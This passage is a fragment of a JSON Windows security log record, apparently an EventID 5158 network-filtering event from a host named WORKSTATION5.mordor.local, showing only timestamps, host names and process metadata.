Connection","@timestamp":"2020-07-22T04:19:00.081Z","LayerRTID":"36","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:58","Severity":"INFO","EventID":5158,"ThreadID":7184,"RecordNumber":258655}
